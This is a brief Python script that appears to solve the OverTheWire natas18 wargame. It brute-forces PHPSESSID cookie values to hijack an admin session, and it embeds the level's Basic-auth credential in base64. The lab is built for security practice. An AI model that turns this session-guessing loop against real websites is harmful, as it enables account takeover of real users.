import requests
import sys

url = "http://natas18.natas.labs.overthewire.org"
magic_content = "You are an admin"
wrong_conent = "You are logged in as a regular user"

for i in range(700):
    payload = {"username": "admin", "password": "pass"}
    headers = {"Cookie": "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}
    resp = requests.post(url, params=payload, headers=headers)
    if magic_content in resp.content:
        print("Solved: " + resp.content)
        sys.exit()
    elif wrong_conent in resp.content:
        if i % 20 == 0:
            print("Trying for the " + str(i) + ". times")
    else:
        print("Failed to solved: " + resp.content)
        sys.exit()
